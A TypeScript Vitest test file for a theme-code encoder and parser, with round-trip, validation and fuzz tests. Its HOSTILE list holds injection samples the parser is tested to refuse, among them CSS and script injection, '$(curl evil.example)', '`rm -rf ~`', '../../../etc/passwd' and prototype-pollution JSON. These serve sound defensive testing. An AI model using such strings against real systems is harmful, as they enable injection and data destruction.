import { describe, expect, it } from 'vitest'
import { cleanTheme, defaultTheme, harmonize, noiseImage, pagePaletteVars, themeVars, type Appearance, type SpaceTheme } from './theme'
import { THEME_CODE_MAX_LENGTH, encodeThemeCode, parseThemeCode, parseThemeRequest, pastedThemePatch, themeCodeMessage, type ThemeCodeError } from './theme-code'

// Dracula-ish, written by hand so that the format is pinned: a change of the code of this theme is a change of the format.
const SAMPLE: SpaceTheme = { baseColors: ['#bd93f9', '#8be9fd'], harmony: 'custom', angle: 155, intensity: 0.85, overlay: 'grain', noise: 0.1, translucency: 'light', vibrant: true, appearance: 'dark' }
const SAMPLE_CODE = 'luc1_bd93f9-8be9fd_custom_155_85_grain_10_light_vivid_dark'

const parsed = (text: unknown) => parseThemeCode(text)
const themeOf = (text: unknown): SpaceTheme => {
  const result = parseThemeCode(text)
  if (!result.ok || result.kind !== 'theme') throw new Error(`not a theme: ${JSON.stringify(result)}`)
  return result.theme
}
const reasonOf = (text: unknown): ThemeCodeError | null => {
  const result = parseThemeCode(text)
  return result.ok ? null : result.reason
}

/** A seeded random generator, so a failure of the fuzz tests can be replayed. */
function rng(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

const HEX_COLOR = /^#[0-9a-f]{6}$/
const HEX_COLOR_ALPHA = /^#[0-9a-f]{6}([0-9a-f]{2})?$/
/** The inks `spaceInks` writes on a space: the soft and the plain ink of each appearance, and the secondary inks made of them. */
const SPACE_INK_COLOR = /^#(1a1d2b|000000|f1f2f6|ffffff)$/
const SPACE_INK_AT_OPACITY = /^rgb\((26 29 43|0 0 0|241 242 246|255 255 255) \/ (0\.\d{1,2}|1)\)$/
const SPACE_INK_NAMES = new Set(['--text-on-space-2', '--text-on-tile-2', '--text-on-tile-hover-2', '--glyph-on-space', '--muted'])

/**
 * Every value `themeVars` and `pagePaletteVars` put in a stylesheet or an inline style, checked against the grammar of what they can
 * be. A text that got through the parser would show up here as something outside it.
 */
function assertSafeVars(vars: Record<string, string>, palette: Record<string, string>, appearance: 'light' | 'dark') {
  const constants = new Set(Object.values(themeVars(defaultTheme(), appearance)).filter((v) => !v.startsWith('linear-gradient') && !v.startsWith('url(')))
  const textures = new Set(['none', ...(['grain', 'fine', 'coarse'] as const).map((o) => noiseImage(o)!)])
  for (const [name, value] of Object.entries(vars)) {
    if (name === '--bg-gradient') expect(value).toMatch(/^linear-gradient\(\d{1,3}deg(, #[0-9a-f]{6}){2,3}\)$/)
    else if (name === '--hue') expect(value).toMatch(/^\d{1,3}$/)
    else if (name === '--grain-opacity') expect(value).toMatch(/^\d(\.\d{1,3})?$/)
    else if (name === '--grain-image') expect(textures.has(value), name).toBe(true)
    // The inks of the space are measured on its colours: one of four inks, alone or at an opacity of two decimals at most.
    else if (name === '--text-on-space' || name === '--text-on-tile-hover') expect(value, name).toMatch(SPACE_INK_COLOR)
    else if (SPACE_INK_NAMES.has(name)) expect(value, name).toMatch(SPACE_INK_AT_OPACITY)
    else expect(constants.has(value), `${name}: ${value}`).toBe(true)
  }
  for (const [name, value] of Object.entries(palette)) {
    if (name === '--arc-background-gradient-color') expect(value).toMatch(/^linear-gradient\(\d{1,3}deg, #[0-9a-f]{6}, #[0-9a-f]{6}\)$/)
    else expect(value, name).toMatch(HEX_COLOR_ALPHA)
  }
}

const assertSafeStyle = (theme: SpaceTheme, appearance: 'light' | 'dark') => assertSafeVars(themeVars(theme, appearance), pagePaletteVars(theme, appearance), appearance)

describe('encodeThemeCode', () => {
  it('writes a theme as readable fields, in a fixed order, behind the version', () => {
    expect(encodeThemeCode(SAMPLE)).toBe(SAMPLE_CODE)
  })

  it('pins the code of the default theme (a change of it is a change of the format)', () => {
    expect(encodeThemeCode(defaultTheme())).toBe('luc1_5139c6-aec639_complementary_155_100_grain_0_light_vivid_auto')
  })

  it('writes the opposite choices as their other words', () => {
    const code = encodeThemeCode({ ...SAMPLE, translucency: 'dark', vibrant: false, appearance: 'light', overlay: 'coarse', harmony: 'custom' })
    expect(code).toBe('luc1_bd93f9-8be9fd_custom_155_85_coarse_10_dark_muted_light')
  })

  it('is a short single line of plain characters, even with three colours', () => {
    const code = encodeThemeCode({ ...SAMPLE, baseColors: ['#ffffff', '#000000', '#123456'], harmony: 'custom', overlay: 'fine', appearance: 'auto' })
    expect(code.length).toBeLessThan(THEME_CODE_MAX_LENGTH / 2)
    expect(code).toMatch(/^[a-z0-9_-]+$/)
  })

  it('never writes more than 76 characters, far under what the parser accepts', () => {
    const longest = cleanTheme({ baseColors: ['#ffffff', '#eeeeee', '#dddddd'], harmony: 'complementary', angle: 360, intensity: 1, overlay: 'coarse', noise: 1, translucency: 'light', vibrant: true, appearance: 'light' })
    expect(longest.baseColors).toHaveLength(3)
    expect(encodeThemeCode(longest).length).toBeLessThanOrEqual(76)
    expect(THEME_CODE_MAX_LENGTH).toBeGreaterThan(76 * 2)
  })

  it('repairs a broken theme instead of writing its fields as they are', () => {
    const code = encodeThemeCode({ ...SAMPLE, intensity: 9, angle: -40, baseColors: ['red;}'] } as unknown as SpaceTheme)
    expect(code).toMatch(/^luc1_[0-9a-f]{6}(-[0-9a-f]{6}){0,2}_[a-z]+_\d+_\d+_[a-z]+_\d+_[a-z]+_[a-z]+_[a-z]+$/)
    expect(parseThemeCode(code).ok).toBe(true)
  })
})

describe('parseThemeCode: a theme code', () => {
  it('reads a code back into the theme it was written from', () => {
    expect(themeOf(SAMPLE_CODE)).toEqual(SAMPLE)
  })

  it('round-trips the default theme, the extremes and every harmony, texture and appearance', () => {
    const themes: SpaceTheme[] = [
      defaultTheme(),
      { ...SAMPLE, intensity: 0, noise: 0, angle: 0 },
      { ...SAMPLE, intensity: 1, noise: 1, angle: 360 },
      ...(['complementary', 'analogous', 'triadic', 'monochrome', 'custom'] as const).map((harmony) => cleanTheme({ ...SAMPLE, baseColors: ['#336699', '#aa5500', '#00aa55'], harmony })),
      ...(['none', 'grain', 'fine', 'coarse'] as const).map((overlay) => ({ ...SAMPLE, overlay })),
      ...(['auto', 'light', 'dark'] as const satisfies readonly Appearance[]).map((appearance) => ({ ...SAMPLE, appearance })),
      { ...SAMPLE, baseColors: ['#010203'] }
    ]
    for (const theme of themes) {
      const code = encodeThemeCode(theme)
      expect(themeOf(code), code).toEqual(cleanTheme(theme))
      expect(encodeThemeCode(themeOf(code))).toBe(code)
    }
  })

  it('keeps a derived harmony derived: the companions follow the first colour whatever the code says', () => {
    const forged = themeOf('luc1_ff0000-123456_complementary_155_100_grain_0_light_vivid_auto')
    expect(forged.baseColors).toEqual(harmonize('#ff0000', 'complementary', 2))
  })

  it('reads numbers as whole degrees and percents, which is the precision of the code', () => {
    const t = themeOf(encodeThemeCode({ ...SAMPLE, intensity: 0.8537, noise: 0.123, angle: 154.6 }))
    expect(t.intensity).toBe(0.85)
    expect(t.noise).toBe(0.12)
    expect(t.angle).toBe(155)
  })

  it('accepts what a person adds around a code: spaces, line breaks, a pair of quotes or backticks, capital letters', () => {
    for (const text of [`  ${SAMPLE_CODE}\n`, `"${SAMPLE_CODE}"`, `'${SAMPLE_CODE}'`, `\`${SAMPLE_CODE}\``, ` " ${SAMPLE_CODE} " `, SAMPLE_CODE.toUpperCase(), 'Luc1_BD93F9-8BE9FD_Custom_155_85_Grain_10_Light_Vivid_Dark']) {
      expect(themeOf(text), text).toEqual(SAMPLE)
    }
  })

  it('refuses a code of another version with a message of its own, and does not guess at it', () => {
    expect(reasonOf('luc2_bd93f9_custom_155_85_grain_10_light_vivid_dark')).toBe('unknown-version')
    expect(reasonOf('luc0_bd93f9')).toBe('unknown-version')
    expect(reasonOf('luc10_bd93f9-8be9fd_custom_155_85_grain_10_light_vivid_dark')).toBe('unknown-version')
  })

  it('refuses a code with a missing or an extra field', () => {
    const fields = SAMPLE_CODE.split('_')
    expect(reasonOf(fields.slice(0, -1).join('_'))).toBe('malformed')
    expect(reasonOf(`${SAMPLE_CODE}_extra`)).toBe('malformed')
    expect(reasonOf(`${SAMPLE_CODE}_`)).toBe('malformed')
    expect(reasonOf('luc1_')).toBe('malformed')
    expect(reasonOf('luc1__bd93f9_custom_155_85_grain_10_light_vivid_dark')).toBe('malformed')
  })

  it('refuses a number out of its range or not written as a whole number', () => {
    const withField = (index: number, value: string) => SAMPLE_CODE.split('_').map((f, i) => (i === index ? value : f)).join('_')
    for (const [index, bad] of [[3, '361'], [3, '-1'], [3, '15.5'], [3, '1e2'], [3, ''], [3, ' 5'], [3, '9999'], [3, 'nan'], [4, '101'], [4, '-5'], [4, '0.5'], [4, '1000'], [6, '101'], [6, '1e1'], [6, '']] as const) {
      expect(reasonOf(withField(index, bad)), `${index}: ${bad}`).toBe('malformed')
    }
    expect(themeOf(withField(3, '360')).angle).toBe(360)
    expect(themeOf(withField(4, '100')).intensity).toBe(1)
    expect(themeOf(withField(4, '0')).intensity).toBe(0)
  })

  it('refuses a word that is not one of the known ones, in every field that has a list', () => {
    const withField = (index: number, value: string) => SAMPLE_CODE.split('_').map((f, i) => (i === index ? value : f)).join('_')
    for (const [index, bad] of [[2, 'rainbow'], [2, 'complimentary'], [5, 'sparkle'], [7, 'clear'], [8, 'vibrant'], [9, 'sepia'], [9, 'dark-light']] as const) {
      expect(reasonOf(withField(index, bad)), `${index}: ${bad}`).toBe('malformed')
    }
  })

  it('refuses a colour that is not six hex digits, and zero or more than three colours', () => {
    const withColors = (colors: string) => SAMPLE_CODE.split('_').map((f, i) => (i === 1 ? colors : f)).join('_')
    for (const bad of ['', 'bd93f', 'bd93f9a', '#bd93f9', 'bd93fg', 'red', 'bd93f9-', '-bd93f9', 'bd93f9--8be9fd', 'bd93f9-8be9fd-123456-abcdef', 'bd93f9 8be9fd', 'bd93f9,8be9fd']) {
      expect(reasonOf(withColors(bad)), bad).toBe('malformed')
    }
    expect(themeOf(withColors('bd93f9-8be9fd-123456')).baseColors).toHaveLength(3)
    expect(themeOf(withColors('bd93f9')).baseColors).toEqual(['#bd93f9'])
  })
})

describe('parseThemeCode: a colour', () => {
  it('reads #RRGGBB, RRGGBB and #RGB in any case', () => {
    for (const [text, hex] of [['#BD93F9', '#bd93f9'], ['bd93f9', '#bd93f9'], ['  #bd93f9 ', '#bd93f9'], ['#fa0', '#ffaa00'], ['"#282A36"', '#282a36'], ['000000', '#000000']] as const) {
      expect(parsed(text), text).toEqual({ ok: true, kind: 'color', color: hex })
    }
  })

  it('reads a CSS rgb() or rgba() colour, but not a transparent one', () => {
    expect(parsed('rgb(189, 147, 249)')).toEqual({ ok: true, kind: 'color', color: '#bd93f9' })
    expect(parsed('rgba(189 147 249 / 50%)')).toEqual({ ok: true, kind: 'color', color: '#bd93f9' })
    expect(reasonOf('rgba(189, 147, 249, 0)')).toBe('not-a-theme')
  })

  it('refuses what only looks like a colour', () => {
    for (const bad of ['#12345', '#1234567', '12345', '1234567', '#gggggg', 'abc', '#abcd', '0xbd93f9', 'rgb(1, 2)', 'rgb(1, 2, 3, 4, 5)', 'rgb(999, 0, 0, )', 'hsl(0, 0%, 0%)', 'red', 'bd93f9;', '#bd93f9 #8be9fd']) {
      expect(reasonOf(bad), bad).toBe('not-a-theme')
    }
  })

  it('becomes the base colour of the theme it is pasted into, the harmony still deriving the others', () => {
    const derived = cleanTheme({ ...SAMPLE, harmony: 'complementary' })
    const patch = pastedThemePatch({ ok: true, kind: 'color', color: '#ff0000' }, derived)
    expect(patch).toEqual({ baseColors: harmonize('#ff0000', 'complementary', 2) })
    const custom = pastedThemePatch({ ok: true, kind: 'color', color: '#ff0000' }, SAMPLE)
    expect(custom).toEqual({ baseColors: ['#ff0000', '#8be9fd'] })
  })

  it('replaces the whole theme when a code is pasted', () => {
    const result = parseThemeCode(SAMPLE_CODE)
    expect(result.ok && pastedThemePatch(result, defaultTheme())).toEqual(SAMPLE)
  })
})

describe('parseThemeCode: what is not a theme', () => {
  it('refuses an empty text and a text that is not a text', () => {
    for (const empty of ['', ' ', '\n\t  ', '""', "''", '``']) expect(reasonOf(empty), JSON.stringify(empty)).toBe('empty')
    for (const odd of [null, undefined, 12, true, {}, [], ['luc1_x'], { toString: () => SAMPLE_CODE }, Symbol('x')]) expect(reasonOf(odd), String(typeof odd)).toBe('not-a-theme')
  })

  it('refuses any text longer than a code can be, before reading it', () => {
    expect(reasonOf(' '.repeat(THEME_CODE_MAX_LENGTH * 2 + 1))).toBe('too-long')
    expect(reasonOf('a'.repeat(THEME_CODE_MAX_LENGTH + 1))).toBe('too-long')
    expect(reasonOf(`${SAMPLE_CODE}${'_x'.repeat(200)}`)).toBe('too-long')
    expect(reasonOf('x'.repeat(2_000_000))).toBe('too-long')
    expect(reasonOf('luc1_'.repeat(100_000))).toBe('too-long')
  })

  it('lets a code with the padding of a chat message through, up to the limit', () => {
    expect(themeOf(`${' '.repeat(THEME_CODE_MAX_LENGTH - SAMPLE_CODE.length)}${SAMPLE_CODE}`)).toEqual(SAMPLE)
  })

  it('says what is wrong in a sentence for every reason', () => {
    const reasons: ThemeCodeError[] = ['empty', 'too-long', 'unknown-version', 'malformed', 'not-a-theme']
    const messages = reasons.map(themeCodeMessage)
    expect(new Set(messages).size).toBe(reasons.length)
    for (const message of messages) expect(message).toMatch(/[a-zé]{4}/)
  })
})

/** Texts that try to get something into the state, a stylesheet, a page or the shell. None of them is a theme. */
const HOSTILE = [
  'luc1_bd93f9;}body{display:none}_custom_155_85_grain_10_light_vivid_dark',
  'luc1_bd93f9-8be9fd_custom_155_85_grain_10_light_vivid_dark;}*{background:url(https://evil.example/x)}',
  'luc1_bd93f9-8be9fd_custom_155_85_url(https://evil.example/x)_10_light_vivid_dark',
  'luc1_bd93f9-8be9fd_custom_155_85_grain_10_light_vivid_dark</style><script>alert(1)</script>',
  'luc1_bd93f9_custom_155deg);}body{x:(_85_grain_10_light_vivid_dark',
  'luc1_bd93f9_custom_155_85_grain_10_light_vivid_dark\u0000',
  'luc1_bd93f9_custom_155_85_grain_10_light_vivid_dark‮',
  'luc1_bd93f9_custom_155_85_grain_10_light_vivid_dark\n--hue: 0',
  'luc1_бd93f9_custom_155_85_grain_10_light_vivid_dark',
  'luc1_bd93f9_cуstom_155_85_grain_10_light_vivid_dark',
  'luc1_bd93f9_custom_１５５_85_grain_10_light_vivid_dark',
  'luc1_bd93f9_custom_155_85_grain_10_light_vivid_dark_constructor',
  '__proto__',
  '{"__proto__":{"polluted":true},"baseColors":["#ff0000"]}',
  '{"baseColors":["#ff0000;}body{x:y"],"harmony":"custom"}',
  'javascript:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  'file:///etc/passwd',
  '../../../etc/passwd',
  '$(curl evil.example)',
  '`rm -rf ~`',
  '<img src=x onerror=alert(1)>',
  'url(https://evil.example/x)',
  '#bd93f9 }body{display:none',
  'rgb(1, 2, 3); background: url(x)',
  'rgb(1, 2, 3) !important',
  '#ff0000\u0000',
  '%23ff0000',
  '&#35;ff0000',
  'luc1_' + 'ff0000-'.repeat(60) + 'ff0000_custom_155_85_grain_10_light_vivid_dark'
]

describe('hostile input', () => {
  it('is refused, never read as a theme or a colour', () => {
    for (const text of HOSTILE) expect(parsed(text).ok, JSON.stringify(text.slice(0, 80))).toBe(false)
  })

  it('does not even reach the parser as an object that would run code when read as text', () => {
    let called = 0
    const trap = { toString: () => (called++, SAMPLE_CODE), valueOf: () => (called++, SAMPLE_CODE), [Symbol.toPrimitive]: () => (called++, SAMPLE_CODE) }
    expect(parsed(trap).ok).toBe(false)
    expect(called).toBe(0)
  })

  it('leaves the shape of the result alone: no extra field of the pasted text reaches the theme', () => {
    const theme = themeOf(SAMPLE_CODE)
    expect(Object.keys(theme).sort()).toEqual(['angle', 'appearance', 'baseColors', 'harmony', 'intensity', 'noise', 'overlay', 'translucency', 'vibrant'])
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined()
  })

  it('cannot put anything but the fixed grammar into the style of the interface, whatever is pasted', () => {
    // Texts that are valid codes with the most extreme values the grammar allows, next to the hostile ones above.
    const extremes = [
      'luc1_000000_custom_0_0_none_0_light_muted_light',
      'luc1_ffffff-ffffff-ffffff_triadic_360_100_coarse_100_dark_vivid_dark',
      'luc1_fffffe_monochrome_360_100_fine_100_dark_vivid_auto'
    ]
    for (const text of [...HOSTILE, ...extremes]) {
      const result = parsed(text)
      if (!result.ok || result.kind !== 'theme') continue
      assertSafeStyle(result.theme, 'dark')
      assertSafeStyle(result.theme, 'light')
    }
    expect(extremes.every((t) => parsed(t).ok)).toBe(true)
  })

  it('checks the style grammar for real: a value out of it makes the check fail', () => {
    const vars = themeVars(defaultTheme(), 'dark')
    const palette = pagePaletteVars(defaultTheme(), 'dark')
    expect(() => assertSafeVars(vars, palette, 'dark')).not.toThrow()
    expect(() => assertSafeVars({ ...vars, '--bg-gradient': 'linear-gradient(155deg, #ff0000, url(https://evil.example/x))' }, palette, 'dark')).toThrow()
    expect(() => assertSafeVars({ ...vars, '--text': '#fff;}body{display:none' }, palette, 'dark')).toThrow()
    expect(() => assertSafeVars({ ...vars, '--text-on-space': '#fff;}body{display:none' }, palette, 'dark')).toThrow()
    expect(() => assertSafeVars({ ...vars, '--muted': 'rgb(0 0 0 / 0.5);}body{display:none' }, palette, 'dark')).toThrow()
    expect(() => assertSafeVars({ ...vars, '--text-on-tile-2': 'url(https://evil.example/x)' }, palette, 'dark')).toThrow()
    expect(() => assertSafeVars({ ...vars, '--grain-image': 'url(https://evil.example/x)' }, palette, 'dark')).toThrow()
    expect(() => assertSafeVars(vars, { ...palette, '--arc-palette-title': 'red;}' }, 'dark')).toThrow()
  })
})

describe('fuzz', () => {
  const ALPHABET = 'abcdef0123456789_-#:;(){}<>/\\"\' `\n\t\u0000%&$.,=+*?!|~^[]@AZ‮éб'

  function mutate(text: string, random: () => number): string {
    let out = text
    const edits = 1 + Math.floor(random() * 4)
    for (let i = 0; i < edits; i++) {
      const at = Math.floor(random() * (out.length + 1))
      const char = ALPHABET[Math.floor(random() * ALPHABET.length)]!
      const kind = random()
      out = kind < 0.4 ? out.slice(0, at) + char + out.slice(at) : kind < 0.7 ? out.slice(0, at) + char + out.slice(at + 1) : out.slice(0, at) + out.slice(at + 1)
    }
    return out
  }

  function check(text: string) {
    const result = parsed(text)
    if (!result.ok) return
    if (result.kind === 'color') {
      expect(result.color).toMatch(HEX_COLOR)
      return
    }
    // What got through is a whole, repaired theme whose own code reads back as itself, and whose style is inside the fixed grammar.
    expect(result.theme).toEqual(cleanTheme(result.theme))
    const code = encodeThemeCode(result.theme)
    expect(themeOf(code)).toEqual(result.theme)
    expect(encodeThemeCode(themeOf(code))).toBe(code)
    assertSafeStyle(result.theme, 'dark')
    assertSafeStyle(result.theme, 'light')
  }

  it('never throws on a mutated code and only lets whole, safe themes through', () => {
    const random = rng(20261024)
    const seeds = [SAMPLE_CODE, encodeThemeCode(defaultTheme()), 'luc1_000000_custom_0_0_none_0_light_muted_light', 'luc1_ffffff-ffffff-ffffff_triadic_360_100_coarse_100_dark_vivid_dark', '#bd93f9', 'rgb(1, 2, 3)']
    let accepted = 0
    for (let i = 0; i < 4000; i++) {
      const text = mutate(seeds[i % seeds.length]!, random)
      check(text)
      if (parsed(text).ok) accepted++
    }
    // Some mutations hit a field and keep the code valid (a digit changed to another one): the loop did exercise the accepting path.
    expect(accepted).toBeGreaterThan(50)
  })

  it('never throws on random text', () => {
    const random = rng(7)
    for (let i = 0; i < 3000; i++) {
      const length = Math.floor(random() * 300)
      let text = ''
      for (let k = 0; k < length; k++) text += ALPHABET[Math.floor(random() * ALPHABET.length)]
      check(text)
    }
  })

  it('round-trips random valid themes', () => {
    const random = rng(99)
    const pick = <T,>(list: readonly T[]): T => list[Math.floor(random() * list.length)]!
    const hex = () => `#${Math.floor(random() * 0x1000000).toString(16).padStart(6, '0')}`
    for (let i = 0; i < 1000; i++) {
      const theme = cleanTheme({
        baseColors: Array.from({ length: 1 + Math.floor(random() * 3) }, hex),
        harmony: pick(['complementary', 'analogous', 'triadic', 'monochrome', 'custom'] as const),
        angle: Math.floor(random() * 361),
        intensity: Math.floor(random() * 101) / 100,
        overlay: pick(['none', 'grain', 'fine', 'coarse'] as const),
        noise: Math.floor(random() * 101) / 100,
        translucency: pick(['light', 'dark'] as const),
        vibrant: random() < 0.5,
        appearance: pick(['auto', 'light', 'dark'] as const)
      })
      expect(themeOf(encodeThemeCode(theme))).toEqual(theme)
    }
  })

  it('rounds a theme with finer values than the code holds once, and then no more', () => {
    const random = rng(5)
    for (let i = 0; i < 500; i++) {
      const theme = cleanTheme({ ...SAMPLE, harmony: 'custom', intensity: random(), noise: random(), angle: random() * 360 })
      const first = encodeThemeCode(theme)
      const back = themeOf(first)
      expect(Math.abs(back.intensity - theme.intensity)).toBeLessThanOrEqual(0.005 + 1e-9)
      expect(Math.abs(back.noise - theme.noise)).toBeLessThanOrEqual(0.005 + 1e-9)
      expect(Math.abs(back.angle - theme.angle)).toBeLessThanOrEqual(0.5 + 1e-9)
      expect(encodeThemeCode(back)).toBe(first)
    }
  })
})

describe('parseThemeRequest', () => {
  it('reads the three kinds of request the editor sends', () => {
    expect(parseThemeRequest({ kind: 'copy', text: '#bd93f9' })).toEqual({ kind: 'copy', text: '#bd93f9' })
    expect(parseThemeRequest({ kind: 'paste', spaceId: 's1' })).toEqual({ kind: 'paste', spaceId: 's1' })
    expect(parseThemeRequest({ kind: 'paste', spaceId: 's1', text: SAMPLE_CODE })).toEqual({ kind: 'paste', spaceId: 's1', text: SAMPLE_CODE })
    expect(parseThemeRequest({ kind: 'apply-all', spaceId: 's1' })).toEqual({ kind: 'apply-all', spaceId: 's1' })
  })

  it('reads the two requests that move a theme through a file, which carry no text and no theme of their own', () => {
    expect(parseThemeRequest({ kind: 'export-file', spaceId: 's1' })).toEqual({ kind: 'export-file', spaceId: 's1' })
    expect(parseThemeRequest({ kind: 'import-file', spaceId: 's1' })).toEqual({ kind: 'import-file', spaceId: 's1' })
    for (const raw of [
      { kind: 'export-file' },
      { kind: 'import-file', spaceId: '' },
      { kind: 'import-file', spaceId: 7 },
      { kind: 'import-file', spaceId: 's'.repeat(201) },
      { kind: 'import-file', spaceId: 's1', text: SAMPLE_CODE },
      { kind: 'import-file', spaceId: 's1', theme: SAMPLE },
      { kind: 'export-file', spaceId: 's1', theme: SAMPLE },
      { kind: 'export-file', spaceId: 's1', text: 'x' }
    ]) {
      expect(parseThemeRequest(raw), JSON.stringify(raw)?.slice(0, 60)).toBeNull()
    }
  })

  it('repairs the theme of an apply-all request like any theme, so a forged one cannot be applied as it is', () => {
    const request = parseThemeRequest({ kind: 'apply-all', spaceId: 's1', theme: { ...SAMPLE, intensity: 9, baseColors: ['#112233', 'url(x)'], evil: 'x' } })
    expect(request).toEqual({ kind: 'apply-all', spaceId: 's1', theme: cleanTheme({ ...SAMPLE, intensity: 1, baseColors: ['#112233'] }) })
    expect(request && 'theme' in request && request.theme && Object.keys(request.theme).sort()).toEqual(['angle', 'appearance', 'baseColors', 'harmony', 'intensity', 'noise', 'overlay', 'translucency', 'vibrant'])
  })

  it('refuses anything else: another kind, a missing or odd id or text, a theme that is not an object', () => {
    const refused = [
      null, undefined, 'copy', 7, [], [{ kind: 'copy', text: 'x' }], {}, { kind: 'delete', spaceId: 's1' }, { kind: 'copy' }, { kind: 'copy', text: 7 }, { kind: 'copy', text: 'x'.repeat(2001) },
      { kind: 'paste' }, { kind: 'paste', spaceId: '' }, { kind: 'paste', spaceId: 7 }, { kind: 'paste', spaceId: 's'.repeat(201) }, { kind: 'paste', spaceId: 's1', text: 7 }, { kind: 'paste', spaceId: 's1', text: 'x'.repeat(2001) },
      { kind: 'apply-all' }, { kind: 'apply-all', spaceId: 's1', theme: 'red' }, { kind: 'apply-all', spaceId: 's1', theme: [SAMPLE] }, { kind: 'apply-all', spaceId: 's1', theme: null }
    ]
    for (const raw of refused) expect(parseThemeRequest(raw), JSON.stringify(raw)?.slice(0, 60)).toBeNull()
  })
})
